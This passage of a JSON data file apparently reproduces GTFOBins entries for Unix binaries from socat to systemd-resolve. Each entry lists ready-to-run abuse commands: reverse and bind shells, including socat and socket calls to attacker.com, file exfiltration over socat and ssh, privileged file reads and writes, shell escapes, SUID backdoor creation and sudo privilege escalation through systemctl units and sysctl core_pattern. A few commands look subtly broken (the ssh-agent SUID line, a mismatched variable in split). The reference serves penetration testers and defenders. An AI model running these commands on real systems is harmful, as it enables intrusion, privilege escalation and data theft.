                        "code": "RHOST=attacker.com\nRPORT=12345\nsocat tcp-connect:$RHOST:$RPORT exec:/bin/sh,pty,stderr,setsid,sigint,sane"
                    }
                ]
            },
            {
                "function": "Bind shell",
                "description": "It can bind a shell to a local port to allow remote network access.",
                "examples": [
                    {
                        "description": "Run socat FILE:`tty`,raw,echo=0 TCP:target.com:12345 on the attacker box to connect to the shell.",
                        "code": "LPORT=12345\nsocat TCP-LISTEN:$LPORT,reuseaddr,fork EXEC:/bin/sh,pty,stderr,setsid,sigint,sane"
                    }
                ]
            },
            {
                "function": "File upload",
                "description": "It can exfiltrate files on the network.",
                "examples": [
                    {
                        "description": "Run socat -u tcp-listen:12345,reuseaddr open:file_to_save,creat on the attacker box to collect the file.",
                        "code": "RHOST=attacker.com\nRPORT=12345\nLFILE=file_to_send\nsocat -u file:$LFILE tcp-connect:$RHOST:$RPORT"
                    }
                ]
            },
            {
                "function": "File download",
                "description": "It can download remote files.",
                "examples": [
                    {
                        "description": "Run socat -u file:file_to_send tcp-listen:12345,reuseaddr on the attacker box to send the file.",
                        "code": "RHOST=attacker.com\nRPORT=12345\nLFILE=file_to_save\nsocat -u tcp-connect:$RHOST:$RPORT open:$LFILE,creat"
                    }
                ]
            },
            {
                "function": "File write",
                "description": "It writes data to files, it may be used to do privileged writes or write files outside a restricted file system.",
                "examples": [
                    {
                        "description": "",
                        "code": "LFILE=file_to_write\nsocat -u 'exec:echo DATA' \"open:$LFILE,creat\""
                    }
                ]
            },
            {
                "function": "File read",
                "description": "It reads data from files, it may be used to do privileged reads or disclose files outside a restricted file system.",
                "examples": [
                    {
                        "description": "",
                        "code": "LFILE=file_to_read\nsocat -u \"file:$LFILE\" -"
                    }
                ]
            },
            {
                "function": "Sudo",
                "description": "If the binary is allowed to run as superuser by sudo, it does not drop the elevated privileges and may be used to access the file system, escalate or maintain privileged access.",
                "examples": [
                    {
                        "description": "The resulting shell is not a proper TTY shell and lacks the prompt.",
                        "code": "sudo socat stdin exec:/bin/sh"
                    }
                ]
            },
            {
                "function": "Limited SUID",
                "description": "If the binary has the SUID bit set, it may be abused to access the file system, escalate or maintain access with elevated privileges working as a SUID backdoor. If it is used to run commands (e.g., via system()-like invocations) it only works on systems like Debian (<= Stretch) that allow the default sh shell to run with SUID privileges.\n\nThis example creates a local SUID copy of the binary and runs it to maintain elevated privileges. To interact with an existing SUID binary skip the first command and run the program using its original path.",
                "examples": [
                    {
                        "description": "Run socat file:`tty`,raw,echo=0 tcp-listen:12345 on the attacker box to receive the shell.",
                        "code": "sudo install -m =xs $(which socat) .\n\nRHOST=attacker.com\nRPORT=12345\n./socat tcp-connect:$RHOST:$RPORT exec:/bin/sh,pty,stderr,setsid,sigint,sane"
                    }
                ]
            }
        ]
    },
    {
        "name": "socket",
        "url": "https://gtfobins.github.io/gtfobins/socket/",
        "functions": [
            {
                "function": "Reverse shell",
                "description": "It can send back a reverse shell to a listening attacker to open a remote network access.",
                "examples": [
                    {
                        "description": "Run nc -l -p 12345 on the attacker box to receive the shell.",
                        "code": "RHOST=attacker.com\nRPORT=12345\nsocket -qvp '/bin/sh -i' $RHOST $RPORT"
                    }
                ]
            },
            {
                "function": "Bind shell",
                "description": "It can bind a shell to a local port to allow remote network access.",
                "examples": [
                    {
                        "description": "Run nc target.com 12345 on the attacker box to connect to the shell.",
                        "code": "LPORT=12345\nsocket -svp '/bin/sh -i' $LPORT"
                    }
                ]
            }
        ]
    },
    {
        "name": "softlimit",
        "url": "https://gtfobins.github.io/gtfobins/softlimit/",
        "functions": [
            {
                "function": "Shell",
                "description": "It can be used to break out from restricted environments by spawning an interactive system shell.",
                "examples": [
                    {
                        "description": "",
                        "code": "softlimit /bin/sh"
                    }
                ]
            },
            {
                "function": "SUID",
                "description": "If the binary has the SUID bit set, it does not drop the elevated privileges and may be abused to access the file system, escalate or maintain privileged access as a SUID backdoor. If it is used to run sh -p, omit the -p argument on systems like Debian (<= Stretch) that allow the default sh shell to run with SUID privileges.\n\nThis example creates a local SUID copy of the binary and runs it to maintain elevated privileges. To interact with an existing SUID binary skip the first command and run the program using its original path.",
                "examples": [
                    {
                        "description": "",
                        "code": "sudo install -m =xs $(which softlimit) .\n\n./softlimit /bin/sh -p"
                    }
                ]
            },
            {
                "function": "Sudo",
                "description": "If the binary is allowed to run as superuser by sudo, it does not drop the elevated privileges and may be used to access the file system, escalate or maintain privileged access.",
                "examples": [
                    {
                        "description": "",
                        "code": "sudo softlimit /bin/sh"
                    }
                ]
            }
        ]
    },
    {
        "name": "soelim",
        "url": "https://gtfobins.github.io/gtfobins/soelim/",
        "functions": [
            {
                "function": "File read",
                "description": "It reads data from files, it may be used to do privileged reads or disclose files outside a restricted file system.",
                "examples": [
                    {
                        "description": "",
                        "code": "LFILE=file_to_read\nsoelim \"$LFILE\""
                    }
                ]
            },
            {
                "function": "SUID",
                "description": "If the binary has the SUID bit set, it does not drop the elevated privileges and may be abused to access the file system, escalate or maintain privileged access as a SUID backdoor. If it is used to run sh -p, omit the -p argument on systems like Debian (<= Stretch) that allow the default sh shell to run with SUID privileges.\n\nThis example creates a local SUID copy of the binary and runs it to maintain elevated privileges. To interact with an existing SUID binary skip the first command and run the program using its original path.",
                "examples": [
                    {
                        "description": "",
                        "code": "sudo install -m =xs $(which soelim) .\n\nLFILE=file_to_read\n./soelim \"$LFILE\""
                    }
                ]
            },
            {
                "function": "Sudo",
                "description": "If the binary is allowed to run as superuser by sudo, it does not drop the elevated privileges and may be used to access the file system, escalate or maintain privileged access.",
                "examples": [
                    {
                        "description": "",
                        "code": "LFILE=file_to_read\nsudo soelim \"$LFILE\""
                    }
                ]
            }
        ]
    },
    {
        "name": "sort",
        "url": "https://gtfobins.github.io/gtfobins/sort/",
        "functions": [
            {
                "function": "File read",
                "description": "It reads data from files, it may be used to do privileged reads or disclose files outside a restricted file system.",
                "examples": [
                    {
                        "description": "",
                        "code": "LFILE=file_to_read\nsort -m \"$LFILE\""
                    }
                ]
            },
            {
                "function": "SUID",
                "description": "If the binary has the SUID bit set, it does not drop the elevated privileges and may be abused to access the file system, escalate or maintain privileged access as a SUID backdoor. If it is used to run sh -p, omit the -p argument on systems like Debian (<= Stretch) that allow the default sh shell to run with SUID privileges.\n\nThis example creates a local SUID copy of the binary and runs it to maintain elevated privileges. To interact with an existing SUID binary skip the first command and run the program using its original path.",
                "examples": [
                    {
                        "description": "",
                        "code": "sudo install -m =xs $(which sort) .\n\nLFILE=file_to_read\n./sort -m \"$LFILE\""
                    }
                ]
            },
            {
                "function": "Sudo",
                "description": "If the binary is allowed to run as superuser by sudo, it does not drop the elevated privileges and may be used to access the file system, escalate or maintain privileged access.",
                "examples": [
                    {
                        "description": "",
                        "code": "LFILE=file_to_read\nsudo sort -m \"$LFILE\""
                    }
                ]
            }
        ]
    },
    {
        "name": "split",
        "url": "https://gtfobins.github.io/gtfobins/split/",
        "functions": [
            {
                "function": "Shell",
                "description": "It can be used to break out from restricted environments by spawning an interactive system shell.",
                "examples": [
                    {
                        "description": "The shell prompt is not printed.",
                        "code": "split --filter=/bin/sh /dev/stdin"
                    }
                ]
            },
            {
                "function": "Command",
                "description": "It can be used to break out from restricted environments by running non-interactive system commands.",
                "examples": [
                    {
                        "description": "Command execution using an existing or newly created file.",
                        "code": "COMMAND=id\nTF=$(mktemp)\nsplit --filter=$COMMAND $TF"
                    },
                    {
                        "description": "Command execution using stdin (and close it directly).",
                        "code": "COMMAND=id\necho | split --filter=$COMMAND /dev/stdin"
                    }
                ]
            },
            {
                "function": "File write",
                "description": "It writes data to files, it may be used to do privileged writes or write files outside a restricted file system.",
                "examples": [
                    {
                        "description": "Data will be written in the current directory in a file named xaa by default. The input file will be split in multiple smaller files unless the -b option is used, pick a value in MB big enough.",
                        "code": "TF=$(mktemp)\necho DATA >$TF\nsplit -b999m $TF"
                    },
                    {
                        "description": "GNU version only. Data will be written in the current directory in a file named xaa.xxx by default. The input file will be split in multiple smaller files unless the -b option is used, pick a value in MB big enough.",
                        "code": "EXT=.xxx\nTF=$(mktemp)\necho DATA >$TF\nsplit -b999m --additional-suffix $EXTENSION $TF"
                    }
                ]
            },
            {
                "function": "File read",
                "description": "It reads data from files, it may be used to do privileged reads or disclose files outside a restricted file system.",
                "examples": [
                    {
                        "description": "",
                        "code": "LFILE=file_to_read\nTF=$(mktemp)\nsplit $LFILE $TF\ncat $TF*"
                    }
                ]
            },
            {
                "function": "Sudo",
                "description": "If the binary is allowed to run as superuser by sudo, it does not drop the elevated privileges and may be used to access the file system, escalate or maintain privileged access.",
                "examples": [
                    {
                        "description": "The shell prompt is not printed.",
                        "code": "sudo split --filter=/bin/sh /dev/stdin"
                    }
                ]
            }
        ]
    },
    {
        "name": "sqlite3",
        "url": "https://gtfobins.github.io/gtfobins/sqlite3/",
        "functions": [
            {
                "function": "Shell",
                "description": "It can be used to break out from restricted environments by spawning an interactive system shell.",
                "examples": [
                    {
                        "description": "",
                        "code": "sqlite3 /dev/null '.shell /bin/sh'"
                    }
                ]
            },
            {
                "function": "File write",
                "description": "It writes data to files, it may be used to do privileged writes or write files outside a restricted file system.",
                "examples": [
                    {
                        "description": "",
                        "code": "LFILE=file_to_write\nsqlite3 /dev/null -cmd \".output $LFILE\" 'select \"DATA\";'"
                    }
                ]
            },
            {
                "function": "File read",
                "description": "It reads data from files, it may be used to do privileged reads or disclose files outside a restricted file system.",
                "examples": [
                    {
                        "description": "",
                        "code": "LFILE=file_to_read\nsqlite3 << EOF\nCREATE TABLE t(line TEXT);\n.import $LFILE t\nSELECT * FROM t;\nEOF"
                    }
                ]
            },
            {
                "function": "SUID",
                "description": "If the binary has the SUID bit set, it does not drop the elevated privileges and may be abused to access the file system, escalate or maintain privileged access as a SUID backdoor. If it is used to run sh -p, omit the -p argument on systems like Debian (<= Stretch) that allow the default sh shell to run with SUID privileges.\n\nThis example creates a local SUID copy of the binary and runs it to maintain elevated privileges. To interact with an existing SUID binary skip the first command and run the program using its original path.",
                "examples": [
                    {
                        "description": "",
                        "code": "sudo install -m =xs $(which sqlite3) .\n\nLFILE=file_to_read\nsqlite3 << EOF\nCREATE TABLE t(line TEXT);\n.import $LFILE t\nSELECT * FROM t;\nEOF"
                    }
                ]
            },
            {
                "function": "Sudo",
                "description": "If the binary is allowed to run as superuser by sudo, it does not drop the elevated privileges and may be used to access the file system, escalate or maintain privileged access.",
                "examples": [
                    {
                        "description": "",
                        "code": "sudo sqlite3 /dev/null '.shell /bin/sh'"
                    }
                ]
            },
            {
                "function": "Limited SUID",
                "description": "If the binary has the SUID bit set, it may be abused to access the file system, escalate or maintain access with elevated privileges working as a SUID backdoor. If it is used to run commands (e.g., via system()-like invocations) it only works on systems like Debian (<= Stretch) that allow the default sh shell to run with SUID privileges.\n\nThis example creates a local SUID copy of the binary and runs it to maintain elevated privileges. To interact with an existing SUID binary skip the first command and run the program using its original path.",
                "examples": [
                    {
                        "description": "",
                        "code": "sudo install -m =xs $(which sqlite3) .\n\n./sqlite3 /dev/null '.shell /bin/sh'"
                    }
                ]
            }
        ]
    },
    {
        "name": "ss",
        "url": "https://gtfobins.github.io/gtfobins/ss/",
        "functions": [
            {
                "function": "File read",
                "description": "It reads data from files, it may be used to do privileged reads or disclose files outside a restricted file system.",
                "examples": [
                    {
                        "description": "",
                        "code": "LFILE=file_to_read\nss -a -F $LFILE"
                    }
                ]
            },
            {
                "function": "SUID",
                "description": "If the binary has the SUID bit set, it does not drop the elevated privileges and may be abused to access the file system, escalate or maintain privileged access as a SUID backdoor. If it is used to run sh -p, omit the -p argument on systems like Debian (<= Stretch) that allow the default sh shell to run with SUID privileges.\n\nThis example creates a local SUID copy of the binary and runs it to maintain elevated privileges. To interact with an existing SUID binary skip the first command and run the program using its original path.",
                "examples": [
                    {
                        "description": "",
                        "code": "sudo install -m =xs $(which ss) .\n\nLFILE=file_to_read\n./ss -a -F $LFILE"
                    }
                ]
            },
            {
                "function": "Sudo",
                "description": "If the binary is allowed to run as superuser by sudo, it does not drop the elevated privileges and may be used to access the file system, escalate or maintain privileged access.",
                "examples": [
                    {
                        "description": "",
                        "code": "LFILE=file_to_read\nsudo ss -a -F $LFILE"
                    }
                ]
            }
        ]
    },
    {
        "name": "sqlmap",
        "url": "https://gtfobins.github.io/gtfobins/sqlmap/",
        "functions": [
            {
                "function": "Shell",
                "description": "It can be used to break out from restricted environments by spawning an interactive system shell.",
                "examples": [
                    {
                        "description": "",
                        "code": "sqlmap -u 127.0.0.1 --eval=\"import os; os.system('/bin/sh')\""
                    }
                ]
            },
            {
                "function": "Sudo",
                "description": "If the binary is allowed to run as superuser by sudo, it does not drop the elevated privileges and may be used to access the file system, escalate or maintain privileged access.",
                "examples": [
                    {
                        "description": "",
                        "code": "sudo sqlmap -u 127.0.0.1 --eval=\"import os; os.system('/bin/sh')\""
                    }
                ]
            }
        ]
    },
    {
        "name": "ssh-agent",
        "url": "https://gtfobins.github.io/gtfobins/ssh-agent/",
        "functions": [
            {
                "function": "Shell",
                "description": "It can be used to break out from restricted environments by spawning an interactive system shell.",
                "examples": [
                    {
                        "description": "",
                        "code": "ssh-agent /bin/sh"
                    }
                ]
            },
            {
                "function": "SUID",
                "description": "If the binary has the SUID bit set, it does not drop the elevated privileges and may be abused to access the file system, escalate or maintain privileged access as a SUID backdoor. If it is used to run sh -p, omit the -p argument on systems like Debian (<= Stretch) that allow the default sh shell to run with SUID privileges.\n\nThis example creates a local SUID copy of the binary and runs it to maintain elevated privileges. To interact with an existing SUID binary skip the first command and run the program using its original path.",
                "examples": [
                    {
                        "description": "",
                        "code": "sudo install -m =xs $(which ssh-agent) .\n\n./ssh-agent /bin/ -p"
                    }
                ]
            },
            {
                "function": "Sudo",
                "description": "If the binary is allowed to run as superuser by sudo, it does not drop the elevated privileges and may be used to access the file system, escalate or maintain privileged access.",
                "examples": [
                    {
                        "description": "",
                        "code": "sudo ssh-agent /bin/"
                    }
                ]
            }
        ]
    },
    {
        "name": "ssh-keygen",
        "url": "https://gtfobins.github.io/gtfobins/ssh-keygen/",
        "functions": [
            {
                "function": "Library load",
                "description": "It loads shared libraries that may be used to run code in the binary execution context.",
                "examples": [
                    {
                        "description": "",
                        "code": "ssh-keygen -D ./lib.so"
                    }
                ]
            },
            {
                "function": "SUID",
                "description": "If the binary has the SUID bit set, it does not drop the elevated privileges and may be abused to access the file system, escalate or maintain privileged access as a SUID backdoor. If it is used to run sh -p, omit the -p argument on systems like Debian (<= Stretch) that allow the default sh shell to run with SUID privileges.\n\nThis example creates a local SUID copy of the binary and runs it to maintain elevated privileges. To interact with an existing SUID binary skip the first command and run the program using its original path.",
                "examples": [
                    {
                        "description": "",
                        "code": "sudo install -m =xs $(which ssh-keygen) .\n\n./ssh-keygen -D ./lib.so"
                    }
                ]
            },
            {
                "function": "Sudo",
                "description": "If the binary is allowed to run as superuser by sudo, it does not drop the elevated privileges and may be used to access the file system, escalate or maintain privileged access.",
                "examples": [
                    {
                        "description": "",
                        "code": "sudo ssh-keygen -D ./lib.so"
                    }
                ]
            }
        ]
    },
    {
        "name": "ssh-keyscan",
        "url": "https://gtfobins.github.io/gtfobins/ssh-keyscan/",
        "functions": [
            {
                "function": "File read",
                "description": "It reads data from files, it may be used to do privileged reads or disclose files outside a restricted file system.",
                "examples": [
                    {
                        "description": "",
                        "code": "LFILE=file_to_read\nssh-keyscan -f $LFILE"
                    }
                ]
            },
            {
                "function": "SUID",
                "description": "If the binary has the SUID bit set, it does not drop the elevated privileges and may be abused to access the file system, escalate or maintain privileged access as a SUID backdoor. If it is used to run sh -p, omit the -p argument on systems like Debian (<= Stretch) that allow the default sh shell to run with SUID privileges.\n\nThis example creates a local SUID copy of the binary and runs it to maintain elevated privileges. To interact with an existing SUID binary skip the first command and run the program using its original path.",
                "examples": [
                    {
                        "description": "",
                        "code": "sudo install -m =xs $(which ssh-keyscan) .\n\nLFILE=file_to_read\n./ssh-keyscan -f $LFILE"
                    }
                ]
            },
            {
                "function": "Sudo",
                "description": "If the binary is allowed to run as superuser by sudo, it does not drop the elevated privileges and may be used to access the file system, escalate or maintain privileged access.",
                "examples": [
                    {
                        "description": "",
                        "code": "LFILE=file_to_read\nsudo ssh-keyscan -f $LFILE"
                    }
                ]
            }
        ]
    },
    {
        "name": "ssh",
        "url": "https://gtfobins.github.io/gtfobins/ssh/",
        "functions": [
            {
                "function": "Shell",
                "description": "It can be used to break out from restricted environments by spawning an interactive system shell.",
                "examples": [
                    {
                        "description": "Reconnecting may help bypassing restricted shells.",
                        "code": "ssh localhost $SHELL --noprofile --norc"
                    },
                    {
                        "description": "Spawn interactive shell through ProxyCommand option.",
                        "code": "ssh -o ProxyCommand=';sh 0<&2 1>&2' x"
                    },
                    {
                        "description": "Spawn interactive shell on client, requires a successful connection towards host.",
                        "code": "ssh -o PermitLocalCommand=yes -o LocalCommand=/bin/sh host"
                    }
                ]
            },
            {
                "function": "File upload",
                "description": "It can exfiltrate files on the network.",
                "examples": [
                    {
                        "description": "Send local file to a SSH server.",
                        "code": "HOST=user@attacker.com\nRPATH=file_to_save\nLPATH=file_to_send\nssh $HOST \"cat > $RPATH\" < $LPATH"
                    }
                ]
            },
            {
                "function": "File download",
                "description": "It can download remote files.",
                "examples": [
                    {
                        "description": "Fetch a remote file from a SSH server.",
                        "code": "HOST=user@attacker.com\nRPATH=file_to_get\nLPATH=file_to_save\nssh $HOST \"cat $RPATH\" > $LPATH"
                    }
                ]
            },
            {
                "function": "File read",
                "description": "It reads data from files, it may be used to do privileged reads or disclose files outside a restricted file system.",
                "examples": [
                    {
                        "description": "The read file content is corrupted by error prints.",
                        "code": "LFILE=file_to_read\nssh -F $LFILE localhost"
                    }
                ]
            },
            {
                "function": "Sudo",
                "description": "If the binary is allowed to run as superuser by sudo, it does not drop the elevated privileges and may be used to access the file system, escalate or maintain privileged access.",
                "examples": [
                    {
                        "description": "Spawn interactive root shell through ProxyCommand option.",
                        "code": "sudo ssh -o ProxyCommand=';sh 0<&2 1>&2' x"
                    }
                ]
            }
        ]
    },
    {
        "name": "sshpass",
        "url": "https://gtfobins.github.io/gtfobins/sshpass/",
        "functions": [
            {
                "function": "Shell",
                "description": "It can be used to break out from restricted environments by spawning an interactive system shell.",
                "examples": [
                    {
                        "description": "",
                        "code": "sshpass /bin/sh"
                    }
                ]
            },
            {
                "function": "SUID",
                "description": "If the binary has the SUID bit set, it does not drop the elevated privileges and may be abused to access the file system, escalate or maintain privileged access as a SUID backdoor. If it is used to run sh -p, omit the -p argument on systems like Debian (<= Stretch) that allow the default sh shell to run with SUID privileges.\n\nThis example creates a local SUID copy of the binary and runs it to maintain elevated privileges. To interact with an existing SUID binary skip the first command and run the program using its original path.",
                "examples": [
                    {
                        "description": "",
                        "code": "sudo install -m =xs $(which sshpass) .\n\n./sshpass /bin/sh -p"
                    }
                ]
            },
            {
                "function": "Sudo",
                "description": "If the binary is allowed to run as superuser by sudo, it does not drop the elevated privileges and may be used to access the file system, escalate or maintain privileged access.",
                "examples": [
                    {
                        "description": "",
                        "code": "sudo sshpass /bin/sh"
                    }
                ]
            }
        ]
    },
    {
        "name": "stdbuf",
        "url": "https://gtfobins.github.io/gtfobins/stdbuf/",
        "functions": [
            {
                "function": "Shell",
                "description": "It can be used to break out from restricted environments by spawning an interactive system shell.",
                "examples": [
                    {
                        "description": "",
                        "code": "stdbuf -i0 /bin/sh"
                    }
                ]
            },
            {
                "function": "SUID",
                "description": "If the binary has the SUID bit set, it does not drop the elevated privileges and may be abused to access the file system, escalate or maintain privileged access as a SUID backdoor. If it is used to run sh -p, omit the -p argument on systems like Debian (<= Stretch) that allow the default sh shell to run with SUID privileges.\n\nThis example creates a local SUID copy of the binary and runs it to maintain elevated privileges. To interact with an existing SUID binary skip the first command and run the program using its original path.",
                "examples": [
                    {
                        "description": "",
                        "code": "sudo install -m =xs $(which stdbuf) .\n\n./stdbuf -i0 /bin/sh -p"
                    }
                ]
            },
            {
                "function": "Sudo",
                "description": "If the binary is allowed to run as superuser by sudo, it does not drop the elevated privileges and may be used to access the file system, escalate or maintain privileged access.",
                "examples": [
                    {
                        "description": "",
                        "code": "sudo stdbuf -i0 /bin/sh"
                    }
                ]
            }
        ]
    },
    {
        "name": "start-stop-daemon",
        "url": "https://gtfobins.github.io/gtfobins/start-stop-daemon/",
        "functions": [
            {
                "function": "Shell",
                "description": "It can be used to break out from restricted environments by spawning an interactive system shell.",
                "examples": [
                    {
                        "description": "",
                        "code": "start-stop-daemon -n $RANDOM -S -x /bin/sh"
                    }
                ]
            },
            {
                "function": "SUID",
                "description": "If the binary has the SUID bit set, it does not drop the elevated privileges and may be abused to access the file system, escalate or maintain privileged access as a SUID backdoor. If it is used to run sh -p, omit the -p argument on systems like Debian (<= Stretch) that allow the default sh shell to run with SUID privileges.\n\nThis example creates a local SUID copy of the binary and runs it to maintain elevated privileges. To interact with an existing SUID binary skip the first command and run the program using its original path.",
                "examples": [
                    {
                        "description": "",
                        "code": "sudo install -m =xs $(which start-stop-daemon) .\n\n./start-stop-daemon -n $RANDOM -S -x /bin/sh -- -p"
                    }
                ]
            },
            {
                "function": "Sudo",
                "description": "If the binary is allowed to run as superuser by sudo, it does not drop the elevated privileges and may be used to access the file system, escalate or maintain privileged access.",
                "examples": [
                    {
                        "description": "",
                        "code": "sudo start-stop-daemon -n $RANDOM -S -x /bin/sh"
                    }
                ]
            }
        ]
    },
    {
        "name": "strace",
        "url": "https://gtfobins.github.io/gtfobins/strace/",
        "functions": [
            {
                "function": "Shell",
                "description": "It can be used to break out from restricted environments by spawning an interactive system shell.",
                "examples": [
                    {
                        "description": "",
                        "code": "strace -o /dev/null /bin/sh"
                    }
                ]
            },
            {
                "function": "File write",
                "description": "It writes data to files, it may be used to do privileged writes or write files outside a restricted file system.",
                "examples": [
                    {
                        "description": "The data to be written appears amid the syscall log, quoted and with special characters escaped in octal notation. The string representation will be truncated, pick a value big enough. More generally, any binary that executes whatever syscall passing arbitrary data can be used in place of strace - DATA.",
                        "code": "LFILE=file_to_write\nstrace -s 999 -o $LFILE strace - DATA"
                    }
                ]
            },
            {
                "function": "SUID",
                "description": "If the binary has the SUID bit set, it does not drop the elevated privileges and may be abused to access the file system, escalate or maintain privileged access as a SUID backdoor. If it is used to run sh -p, omit the -p argument on systems like Debian (<= Stretch) that allow the default sh shell to run with SUID privileges.\n\nThis example creates a local SUID copy of the binary and runs it to maintain elevated privileges. To interact with an existing SUID binary skip the first command and run the program using its original path.",
                "examples": [
                    {
                        "description": "",
                        "code": "sudo install -m =xs $(which strace) .\n\n./strace -o /dev/null /bin/sh -p"
                    }
                ]
            },
            {
                "function": "Sudo",
                "description": "If the binary is allowed to run as superuser by sudo, it does not drop the elevated privileges and may be used to access the file system, escalate or maintain privileged access.",
                "examples": [
                    {
                        "description": "",
                        "code": "sudo strace -o /dev/null /bin/sh"
                    }
                ]
            }
        ]
    },
    {
        "name": "su",
        "url": "https://gtfobins.github.io/gtfobins/su/",
        "functions": [
            {
                "function": "Sudo",
                "description": "If the binary is allowed to run as superuser by sudo, it does not drop the elevated privileges and may be used to access the file system, escalate or maintain privileged access.",
                "examples": [
                    {
                        "description": "",
                        "code": "sudo su"
                    }
                ]
            }
        ]
    },
    {
        "name": "sudo",
        "url": "https://gtfobins.github.io/gtfobins/sudo/",
        "functions": [
            {
                "function": "Sudo",
                "description": "If the binary is allowed to run as superuser by sudo, it does not drop the elevated privileges and may be used to access the file system, escalate or maintain privileged access.",
                "examples": [
                    {
                        "description": "",
                        "code": "sudo sudo /bin/sh"
                    }
                ]
            }
        ]
    },
    {
        "name": "strings",
        "url": "https://gtfobins.github.io/gtfobins/strings/",
        "functions": [
            {
                "function": "File read",
                "description": "It reads data from files, it may be used to do privileged reads or disclose files outside a restricted file system.",
                "examples": [
                    {
                        "description": "",
                        "code": "LFILE=file_to_read\nstrings \"$LFILE\""
                    }
                ]
            },
            {
                "function": "SUID",
                "description": "If the binary has the SUID bit set, it does not drop the elevated privileges and may be abused to access the file system, escalate or maintain privileged access as a SUID backdoor. If it is used to run sh -p, omit the -p argument on systems like Debian (<= Stretch) that allow the default sh shell to run with SUID privileges.\n\nThis example creates a local SUID copy of the binary and runs it to maintain elevated privileges. To interact with an existing SUID binary skip the first command and run the program using its original path.",
                "examples": [
                    {
                        "description": "",
                        "code": "sudo install -m =xs $(which strings) .\n\nLFILE=file_to_read\n./strings \"$LFILE\""
                    }
                ]
            },
            {
                "function": "Sudo",
                "description": "If the binary is allowed to run as superuser by sudo, it does not drop the elevated privileges and may be used to access the file system, escalate or maintain privileged access.",
                "examples": [
                    {
                        "description": "",
                        "code": "LFILE=file_to_read\nsudo strings \"$LFILE\""
                    }
                ]
            }
        ]
    },
    {
        "name": "sysctl",
        "url": "https://gtfobins.github.io/gtfobins/sysctl/",
        "functions": [
            {
                "function": "Command",
                "description": "It can be used to break out from restricted environments by running non-interactive system commands.",
                "examples": [
                    {
                        "description": "The command is executed by root in the background when a core dump occurs.",
                        "code": "COMMAND='/bin/sh -c id>/tmp/id'\nsysctl \"kernel.core_pattern=|$COMMAND\"\nsleep 9999 &\nkill -QUIT $!\ncat /tmp/id"
                    }
                ]
            },
            {
                "function": "File read",
                "description": "It reads data from files, it may be used to do privileged reads or disclose files outside a restricted file system.",
                "examples": [
                    {
                        "description": "The -p argument can also be used in place of -n. In both cases though the output might get corrupted, so this might not be suitable to read binary files.",
                        "code": "LFILE=file_to_read\n/usr/sbin/sysctl -n \"/../../$LFILE\""
                    }
                ]
            },
            {
                "function": "SUID",
                "description": "If the binary has the SUID bit set, it does not drop the elevated privileges and may be abused to access the file system, escalate or maintain privileged access as a SUID backdoor. If it is used to run sh -p, omit the -p argument on systems like Debian (<= Stretch) that allow the default sh shell to run with SUID privileges.\n\nThis example creates a local SUID copy of the binary and runs it to maintain elevated privileges. To interact with an existing SUID binary skip the first command and run the program using its original path.",
                "examples": [
                    {
                        "description": "",
                        "code": "sudo install -m =xs $(which sysctl) .\n\nCOMMAND='/bin/sh -c id>/tmp/id'\n./sysctl \"kernel.core_pattern=|$COMMAND\"\nsleep 9999 &\nkill -QUIT $!\ncat /tmp/id"
                    }
                ]
            },
            {
                "function": "Sudo",
                "description": "If the binary is allowed to run as superuser by sudo, it does not drop the elevated privileges and may be used to access the file system, escalate or maintain privileged access.",
                "examples": [
                    {
                        "description": "",
                        "code": "COMMAND='/bin/sh -c id>/tmp/id'\nsudo sysctl \"kernel.core_pattern=|$COMMAND\"\nsleep 9999 &\nkill -QUIT $!\ncat /tmp/id"
                    }
                ]
            }
        ]
    },
    {
        "name": "tac",
        "url": "https://gtfobins.github.io/gtfobins/tac/",
        "functions": [
            {
                "function": "File read",
                "description": "It reads data from files, it may be used to do privileged reads or disclose files outside a restricted file system.",
                "examples": [
                    {
                        "description": "",
                        "code": "LFILE=file_to_read\ntac -s 'RANDOM' \"$LFILE\""
                    }
                ]
            },
            {
                "function": "SUID",
                "description": "If the binary has the SUID bit set, it does not drop the elevated privileges and may be abused to access the file system, escalate or maintain privileged access as a SUID backdoor. If it is used to run sh -p, omit the -p argument on systems like Debian (<= Stretch) that allow the default sh shell to run with SUID privileges.\n\nThis example creates a local SUID copy of the binary and runs it to maintain elevated privileges. To interact with an existing SUID binary skip the first command and run the program using its original path.",
                "examples": [
                    {
                        "description": "",
                        "code": "sudo install -m =xs $(which tac) .\n\nLFILE=file_to_read\n./tac -s 'RANDOM' \"$LFILE\""
                    }
                ]
            },
            {
                "function": "Sudo",
                "description": "If the binary is allowed to run as superuser by sudo, it does not drop the elevated privileges and may be used to access the file system, escalate or maintain privileged access.",
                "examples": [
                    {
                        "description": "",
                        "code": "LFILE=file_to_read\nsudo tac -s 'RANDOM' \"$LFILE\""
                    }
                ]
            }
        ]
    },
    {
        "name": "systemctl",
        "url": "https://gtfobins.github.io/gtfobins/systemctl/",
        "functions": [
            {
                "function": "SUID",
                "description": "If the binary has the SUID bit set, it does not drop the elevated privileges and may be abused to access the file system, escalate or maintain privileged access as a SUID backdoor. If it is used to run sh -p, omit the -p argument on systems like Debian (<= Stretch) that allow the default sh shell to run with SUID privileges.\n\nThis example creates a local SUID copy of the binary and runs it to maintain elevated privileges. To interact with an existing SUID binary skip the first command and run the program using its original path.",
                "examples": [
                    {
                        "description": "",
                        "code": "sudo install -m =xs $(which systemctl) .\n\nTF=$(mktemp).service\necho '[Service]\nType=oneshot\nExecStart=/bin/sh -c \"id > /tmp/output\"\n[Install]\nWantedBy=multi-user.target' > $TF\n./systemctl link $TF\n./systemctl enable --now $TF"
                    }
                ]
            },
            {
                "function": "Sudo",
                "description": "If the binary is allowed to run as superuser by sudo, it does not drop the elevated privileges and may be used to access the file system, escalate or maintain privileged access.",
                "examples": [
                    {
                        "description": "",
                        "code": "TF=$(mktemp)\necho /bin/sh >$TF\nchmod +x $TF\nsudo SYSTEMD_EDITOR=$TF systemctl edit system.slice"
                    },
                    {
                        "description": "",
                        "code": "TF=$(mktemp).service\necho '[Service]\nType=oneshot\nExecStart=/bin/sh -c \"id > /tmp/output\"\n[Install]\nWantedBy=multi-user.target' > $TF\nsudo systemctl link $TF\nsudo systemctl enable --now $TF"
                    },
                    {
                        "description": "This invokes the default pager, which is likely to be less, other functions may apply.",
                        "code": "sudo systemctl\n!sh"
                    }
                ]
            }
        ]
    },
    {
        "name": "systemd-resolve",
        "url": "https://gtfobins.github.io/gtfobins/systemd-resolve/",
        "functions": [
            {
                "function": "Sudo",
                "description": "If the binary is allowed to run as superuser by sudo, it does not drop the elevated privileges and may be used to access the file system, escalate or maintain privileged access.",
                "examples": [
                    {
                        "description": "This invokes the default pager, which is likely to be less, other functions may apply.",
                        "code": "sudo systemd-resolve --status\n!sh"
